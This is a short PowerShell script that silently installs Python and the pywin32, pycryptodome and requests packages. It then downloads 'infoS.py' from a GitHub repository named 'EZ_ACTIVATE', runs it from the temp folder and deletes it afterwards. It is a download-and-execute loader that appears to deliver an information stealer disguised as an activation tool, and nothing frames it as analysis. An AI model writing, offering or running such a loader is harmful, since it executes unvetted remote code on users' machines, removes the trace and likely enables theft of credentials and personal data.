# Check if Python is installed
$pythonPath = Get-Command python -ErrorAction SilentlyContinue
if (-not $pythonPath) {
    winget install --id Python.Python.3.12 --silent --accept-package-agreements --accept-source-agreements
    # Refresh environment
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine")
}

# Ensure pip is available
& python -m ensurepip --upgrade

# Install required packages
$requiredPackages = @("pywin32", "pycryptodome", "requests")
foreach ($package in $requiredPackages) {
    & python -m pip install $package --quiet --disable-pip-version-check --upgrade
}

# Download and run script
$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
$tempFile = Join-Path $env:TEMP "infoS.py"
Invoke-WebRequest -Uri $url -OutFile $tempFile
& python $tempFile
Remove-Item $tempFile
